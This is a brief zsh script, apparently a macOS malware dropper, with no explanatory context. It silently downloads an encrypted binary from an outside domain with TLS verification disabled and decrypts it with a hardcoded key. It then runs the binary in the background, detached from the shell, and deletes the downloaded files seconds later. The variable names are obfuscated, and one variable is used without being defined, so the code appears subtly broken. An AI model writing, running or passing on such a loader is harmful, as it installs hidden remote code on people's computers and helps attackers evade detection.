#!/bin/zsh
dczvu=$(mktemp /tmp/8c327a.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/ma083a1b3e7de2b67.bin" -o "$dczvuz" || exit 1
j2cptt=$(stat -f %z "$dczvuz"); t4tc37f=$(( j2cptt - 646 - 3250 ))
tail -c +$(( 646 + 1 )) "$dczvuz" | head -c $t4tc37f | openssl enc -d -aes-256-cbc -k 61df5ecd0c37f82e3f5895c5 -out "$dczvu" 2>/dev/null
[ -s "$dczvu" ] && chmod 700 "$dczvu" && ( "$dczvu" & ) && disown
( sleep 3; rm -f "$dczvu" "$dczvuz" ) &>/dev/null &
